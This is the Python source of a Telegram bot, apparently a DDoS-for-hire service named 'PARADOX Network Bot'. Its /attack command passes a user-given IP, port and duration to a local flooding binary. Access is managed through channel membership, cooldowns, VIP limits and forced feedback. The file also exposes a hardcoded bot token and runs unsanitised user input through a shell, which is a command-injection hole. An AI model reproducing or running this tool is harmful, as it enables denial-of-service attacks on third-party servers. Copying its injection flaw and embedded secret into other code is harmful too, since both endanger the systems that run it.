import telebot
import subprocess
import threading
import time
import random
import os
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# === BOT CONFIGURATION ===
BOT_TOKEN = "7873604969:AAGiBIxasixvlQXrppU4eH62TcFF4VKkn9k"
bot = telebot.TeleBot(BOT_TOKEN)

ADMIN_IDS = [1604629264]
REQUIRED_CHANNELS = ["nxtlvlthings", "NXTLVLPUBLIC"]
FEEDBACK_CHANNEL_ID = -1002285831790
MAIN_GROUP_LINK = "https://t.me/NXTLVLPUBLIC"

MAX_ATTACK_TIME_NORMAL = 120
MAX_ATTACK_TIME_VIP = 240
MAX_CONCURRENT_ATTACKS = 3
RAHUL_PATH = "./bgmi"
BLOCKED_PORTS = [21, 22, 80, 443, 3306, 8700, 20000, 443, 17500, 9031, 20002, 20001]

# === STATE ===
attack_lock = threading.Lock()
running_attacks = []
cooldown_users = {}
banned_users = {}
pending_feedback = {}
feedback_deadlines = {}
pending_admin_replies = {}  # Maps admin ID to target user ID
vip_users = set()

funny_videos = [
    "https://files.catbox.moe/pacadw.mp4",
    "https://files.catbox.moe/8k9zmt.mp4",
    "https://files.catbox.moe/1cskm1.mp4",
    "https://files.catbox.moe/xr9y6b.mp4",
    "https://files.catbox.moe/3honi0.mp4",
    "https://files.catbox.moe/xuhmq0.mp4",
    "https://files.catbox.moe/wjtilc.mp4",
    "https://files.catbox.moe/mit6r7.mp4",
    "https://files.catbox.moe/edaojm.mp4",
    "https://files.catbox.moe/cnc8j7.mp4",
    "https://files.catbox.moe/zr3nhn.mp4",
    "https://files.catbox.moe/o4lege.mp4",
    "https://files.catbox.moe/s6wgor.mp4",
    "https://files.catbox.moe/4kmo3m.mp4",
    "https://files.catbox.moe/em27tu.mp4"
]

def get_random_video():
    return random.choice(funny_videos)

def is_user_joined_all(user_id):
    for channel in REQUIRED_CHANNELS:
        try:
            member = bot.get_chat_member(f"@{channel}", user_id)
            if member.status not in ["member", "creator", "administrator"]:
                return False
        except:
            return False
    return True

# === COMMAND: /start ===
@bot.message_handler(commands=['start'])
def start_cmd(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔹 Join Our Main Group", url=MAIN_GROUP_LINK))

    bot.send_message(
        message.chat.id,
        "🚀 *Welcome to PARADOX Network Bot!*\n\n"
        "💻 Use `/help` to view available Cmd\n"
        "📞 Contact Owner: @LostboiXD",
        parse_mode="Markdown",
        reply_markup=markup
    )

# === COMMAND: /info ===
@bot.message_handler(commands=['info'])
def info(message):
    info_text = (
        "✅ *Bot Information*\n\n"
        "Version: 4.0\n"
        "Developed by: @LostBoiXD\n"
        "This bot is designed to execute specific commands and provide quick responses."
    )
    bot.reply_to(message, info_text, parse_mode="Markdown")

# === COMMAND: /shutdown ===
@bot.message_handler(commands=['shutdown'])
def shutdown(message):
    user_id = message.from_user.id
    if user_id != ADMIN_IDS:
        bot.reply_to(message, "🚫 You are not authorized to shut down the bot.")
        return
    bot.reply_to(message, "🔻 Shutting down the bot. Goodbye!")
    bot.stop_polling()

# === COMMAND: /help ===
@bot.message_handler(commands=['help'])
def help_cmd(message):
    bot.send_message(message.chat.id, """
📖 *COMMAND MENU*
━━━━━━━━━━━━━━━━━━━━
🚀 `/attack` IP PORT TIME – *Launch an attack*  
📝 `/feedback` – *Submit feedback (photo only)*  
👑 `/vipuser` – *[Admin] Make user VIP*
🧩 `/setmax` <number> – *[Admin] Set max attacks* 
📢 `/broadcast` <msg> – *[Admin] Mass message*  
📊 `/stats` – *[Admin] View running attacks* 
⚙️`/info` - *Devloper Information*
🌶️ `/shutdown` - *[Admin] For Bot Shutdown*
━━━━━━━━━━━━━━━━━━━━
""", parse_mode="Markdown")

# === COMMAND: /attack ===
@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = message.from_user.id
    username = message.from_user.first_name

    if not is_user_joined_all(user_id):
        join_links = "\n".join([f"🔗 [ @{ch}](https://t.me/{ch})" for ch in REQUIRED_CHANNELS])
        bot.send_message(message.chat.id, f"🔒 *Please join all required channels first:*\n\n{join_links}", parse_mode="Markdown")
        return

    if user_id in banned_users and time.time() < banned_users[user_id]:
        remaining = int(banned_users[user_id] - time.time())
        bot.send_message(message.chat.id, f"⛔ *You are banned from attacking for* `{remaining}` *seconds*", parse_mode="Markdown")
        return

    if user_id in cooldown_users and time.time() < cooldown_users[user_id]:
        remaining = int(cooldown_users[user_id] - time.time())
        bot.send_message(message.chat.id, f"⏳ _Please wait_ `{remaining}`_seconds before your next attack_", parse_mode="Markdown")
        return

    if user_id in pending_feedback:
        bot.send_message(message.chat.id, "📝 *Please submit your feedback (photo) for your last attack first.*", parse_mode="Markdown")
        return

    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "🚫 *INVALID FORMAT* 🚫\n\n*BOT IS READY TO USE*\n\n⚙️ *Usage:* `/attack` [ IP ] [ PORT ] [ TIME ]\n ", parse_mode="Markdown")
        return

    target, port_str, time_str = args[1], args[2], args[3]
    try:
        port = int(port_str)
        duration = int(time_str)
    except ValueError:
        bot.send_message(message.chat.id, "❌ *PORT and TIME must be numbers.*", parse_mode="Markdown")
        return

    if port in BLOCKED_PORTS:
        bot.send_message(message.chat.id, "🚫 *That port is restricted from attacks.*", parse_mode="Markdown")
        return

    max_time = MAX_ATTACK_TIME_VIP if user_id in vip_users else MAX_ATTACK_TIME_NORMAL
    duration = min(duration, max_time)

    with attack_lock:
        if len(running_attacks) >= MAX_CONCURRENT_ATTACKS:
            bot.send_message(message.chat.id, "📛 *Server is busy. Please try again later.*", parse_mode="Markdown")
            return

        running_attacks.append({
            "user": user_id,
            "target": target,
            "port": port,
            "duration": duration
        })
        pending_feedback[user_id] = True
        feedback_deadlines[user_id] = time.time() + 600  # 10 mins

    if not os.path.exists(RAHUL_PATH):
        bot.send_message(message.chat.id, "⚠️ *binary not found.*", parse_mode="Markdown")
        return
    os.chmod(RAHUL_PATH, 0o755)

    cooldown_users[user_id] = time.time() + duration

    bot.send_video(message.chat.id, get_random_video(), caption=(
        f"🚀 *Attack Started!*\n"
        f"📍 `{target}:{port}`\n"
        f"⏱ Duration: `{duration}s`(_requested {time_str}s_)\n"
        f"👤 User: `{username}`"
    ), parse_mode="Markdown")

    def attack_thread():
        subprocess.run(f"{RAHUL_PATH} {target} {port} {duration}", shell=True)
        bot.send_video(message.chat.id, get_random_video(), caption=(
            f"🚀 *Attack Finished!*\n"
            f"📍 `{target}:{port}`\n"
            f"⏱ Duration: `{duration}s`(_requested {time_str}s_)\n"
            f"📝 Submit Feedback "
        ), parse_mode="Markdown")

    threading.Thread(target=attack_thread, daemon=True).start()

# === COMMAND: /feedback ===
@bot.message_handler(content_types=['photo'])
def photo_feedback(message):
    user_id = message.from_user.id
    username = message.from_user.first_name

    if user_id not in pending_feedback:
        return

    bot.send_message(
        message.chat.id,
        f"⚡ *Hii {username}!* Thankyou For Your feedback has been received and verified⚡",
        parse_mode="Markdown"
    )

    bot.send_photo(
        FEEDBACK_CHANNEL_ID,
        photo=message.photo[-1].file_id,
        caption=f"📥 *Feedback Received!*\n👤 User: `{username}`",
        parse_mode="Markdown"
    )

    pending_feedback.pop(user_id, None)
    feedback_deadlines.pop(user_id, None)


@bot.message_handler(commands=['feedback'])
def invalid_feedback(message):
    bot.send_message(message.chat.id, "❌ *Only photo feedback is accepted. Please send a photo.*", parse_mode="Markdown")

# === ADMIN COMMANDS ===
@bot.message_handler(commands=['setmax'])
def set_max(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        new_max = int(message.text.split()[1])
        global MAX_CONCURRENT_ATTACKS
        MAX_CONCURRENT_ATTACKS = new_max
        bot.send_message(message.chat.id, f"✅ Max attacks set to `{new_max}`", parse_mode="Markdown")
    except:
        bot.send_message(message.chat.id, "⚙️ Usage: `/setmax <number>`", parse_mode="Markdown")

@bot.message_handler(commands=['vipuser'])
def vip_user(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    if message.reply_to_message:
        uid = message.reply_to_message.from_user.id
        vip_users.add(uid)
        bot.send_message(message.chat.id, f"👑 *User promoted to VIP!*", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "⚙️ *Reply to the user you want to make VIP.*", parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    msg = message.text.replace("/broadcast", "").strip()
    bot.send_message(message.chat.id, f"📢 *Broadcast preview:*\n\n{msg}", parse_mode="Markdown")

@bot.message_handler(commands=['stats'])
def stats(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    if not running_attacks:
        bot.send_message(message.chat.id, "📈 *No active attacks.*", parse_mode="Markdown")
        return
    out = "*📊 Current Attacks:*\n"
    for a in running_attacks:
        out += f"🎯 `{a['target']}:{a['port']}` – `{a['duration']}s`\n"
    bot.send_message(message.chat.id, out, parse_mode="Markdown")

# === FEEDBACK WATCHDOG ===
def feedback_check_loop():
    while True:
        now = time.time()
        for uid in list(feedback_deadlines.keys()):
            if now > feedback_deadlines[uid]:
                banned_users[uid] = now + 2700  # 45 minutes
                pending_feedback.pop(uid, None)
                feedback_deadlines.pop(uid, None)
        time.sleep(10)

threading.Thread(target=feedback_check_loop, daemon=True).start()

# === USER ↔️ ADMIN MESSAGING ===
@bot.message_handler(func=lambda m: m.chat.type == "private", content_types=['text', 'photo', 'video', 'document', 'voice', 'sticker'])
def forward_user(message):
    if message.from_user.id in ADMIN_IDS:
        return
    for admin_id in ADMIN_IDS:
        bot.forward_message(admin_id, message.chat.id, message.message_id)
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💬 Reply to User", callback_data=f"reply_{message.from_user.id}"))
        bot.send_message(admin_id, f"🆔 UserID: `{message.from_user.id}`", parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def handle_reply_button(call):
    user_id = int(call.data.split("_")[1])
    admin_id = call.from_user.id
    pending_admin_replies[admin_id] = user_id
    bot.send_message(admin_id, f"✏️ Please reply now to message user `{user_id}`", parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.from_user.id in ADMIN_IDS)
def handle_admin_reply(message):
    admin_id = message.from_user.id
    if admin_id in pending_admin_replies:
        user_id = pending_admin_replies.pop(admin_id)
        try:
            bot.send_message(user_id, f"💬 *Admin Reply:*\n{message.text}", parse_mode="Markdown")
            bot.send_message(admin_id, "✅ Your message has been sent to the user.", parse_mode="Markdown")
        except:
            bot.send_message(admin_id, "❌ Failed to send reply.", parse_mode="Markdown")

# === START BOT ===
print(f"PARADOX ka Bot Chalu Ho gya")
bot.polling(none_stop=True)
